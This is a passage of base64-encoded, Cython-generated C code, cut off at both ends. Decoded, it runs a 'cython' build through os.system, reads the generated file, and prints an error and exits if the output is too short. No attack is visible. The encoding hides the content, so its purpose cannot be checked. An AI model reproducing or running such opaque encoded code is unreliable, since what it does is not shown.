X19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAge1xuICAgICAge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF85LCAmX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAge1xuICAgICAgICAgIF9fcHl4X3Zfb3V0cHV0X2YgPSBfX3B5eF90XzM7XG4gICAgICAgICAgX19weXhfdF8zID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X3Zfb3V0cHV0X2Y7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19weXhfdF82ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xLCBfX3B5eF92X2FhfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93cml0ZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7XG4gICAgICAgIF9fcHl4X0w3X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5nIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8xLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzMsIF9fcHl4X3RfMSwgX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNjEsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X3RfNCwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xMiA8ICgwKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19weXhfdF8xMyA9ICghX19weXhfdF8xMik7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTMpKSB7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzMsIF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgICAgIF9fcHl4X3RfMyA9IDA7ICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8yID0gMDsgXG4gICAgICAgICAgICBfX1BZWF9FUlIoMCwgNjEsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MOV9leGNlcHRfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzksIF9fcHl4X3RfMTApO1xuICAgICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgICAgICBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfOSwgX19weXhfdF8xMCk7XG4gICAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjtcbiAgICAgIH1cbiAgICB9XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgaWYgKF9fcHl4X3RfNykge1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0sIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MNjtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w2OjtcbiAgICB9XG4gICAgZ290byBfX3B5eF9MMTY7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDE2OjtcbiAgfVxuXG4gIFxuICBfX3B5eF90XzEgPSBOVUxMO1xuICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gIF9fcHl4X3RfMyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IFxuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzkybV8zOF81XzQ4bUFERElOR19DWVRIT05fTEFZfTtcbiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDY0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzEgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMG19O1xuICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNjUsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDY4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jeXRob25fbSwgX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgX19weXhfdF8xID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTtcbiAgICBhc3NlcnQoX19weXhfdF8xKTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF82ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEsIF9fcHl4X3RfNX07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA2OCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVwbGFjZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF92X25hbWUyID0gX19weXhfdF80O1xuICBfX3B5eF90XzQgPSAwO1xuXG4gIFxuICAge1xuICAgIF9fcHl4X3RfMiA9IE5VTEw7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fb3Blbik7XG4gICAgX19weXhfdF81ID0gX19weXhfYnVpbHRpbl9vcGVuOyBcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9uYW1lMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbSwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fcHl4X3RfNiA9IDE7XG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMiwgX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcn07XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDMtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgfVxuICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fcHl4X3RfMyA9IE5VTEw7XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTdfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgX19weXhfdF82ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzIpKSkge1xuICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8yKTtcbiAgICAgIGFzc2VydChfX3B5eF90XzMpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8yLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF82ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgTlVMTH07XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMTdfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICB9XG4gICAgX19weXhfdF8yID0gX19weXhfdF81O1xuICAgIF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTAsICZfX3B5eF90XzksICZfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzI7XG4gICAgICAgICAgX19weXhfdF8yID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9O1xuICAgICAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlYWQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF90XzE0ID0gUHlPYmplY3RfTGVuZ3RoKF9fcHl4X3RfMik7IGlmICh1bmxpa2VseShfX3B5eF90XzE0ID09ICgoUHlfc3NpemVfdCktMSkpKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICBfX3B5eF90XzEzID0gKF9fcHl4X3RfMTQgPCAweDNFOCk7XG4gICAgICAgICAgaWYgKF9fcHl4X3RfMTMpIHtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gICAgICAgICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0ZhaWxlZF9jeXRob25fZXJyb3J9O1xuICAgICAgICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMjFfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2V4aXQpO1xuICAgICAgICAgICAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9leGl0OyBcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9O1xuICAgICAgICAgICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMjFfZXJ